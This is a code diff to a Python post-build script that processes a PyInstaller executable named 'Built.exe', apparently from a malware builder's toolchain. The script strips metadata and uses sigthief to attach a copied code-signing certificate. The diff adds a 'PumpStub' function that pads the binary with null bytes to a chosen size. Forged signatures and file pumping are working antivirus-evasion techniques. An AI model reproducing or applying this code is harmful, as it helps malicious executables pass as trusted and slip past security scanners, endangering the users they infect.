@@ -1,7 +1,9 @@
 import os
 from sigthief import signfile
+from PyInstaller.archive.readers import CArchiveReader
 
 def RemoveMetaData(path: str):
+    print("Removing MetaData")
     with open(path, "rb") as file:
         data = file.read()
     
@@ -24,14 +26,38 @@ def RemoveMetaData(path: str):
         file.write(data)
 
 def AddCertificate(path: str):
+    print("Adding Certificate")
     certFile = "cert"
     if os.path.isfile(certFile):
         signfile(path, certFile, path)
+
+def PumpStub(path: str, pumpFile: str):
+    print("Pumping Stub")
+    try:
+        pumpedSize = 0
+        if os.path.isfile(pumpFile):
+            with open(pumpFile, "r") as file:
+                pumpedSize = int(file.read())
+    
+        if pumpedSize > 0 and os.path.isfile(path):
+            reader = CArchiveReader(path)
+            offset = reader._start_offset
+
+            with open(path, "r+b") as file:
+                data = file.read()
+                if pumpedSize > len(data):
+                    pumpedSize -= len(data)
+                    file.seek(0)
+                    file.write(data[:offset] + b"\x00" * pumpedSize + data[offset:])
+
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     builtFile = os.path.join("dist", "Built.exe")
     if os.path.isfile(builtFile):
         RemoveMetaData(builtFile)
         AddCertificate(builtFile)
+        PumpStub(builtFile, "pumpStub")
     else:
         print("Not Found")
